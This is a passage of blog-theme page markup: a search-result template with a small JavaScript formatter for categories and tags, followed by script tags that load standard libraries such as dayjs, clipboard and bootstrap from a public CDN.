pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
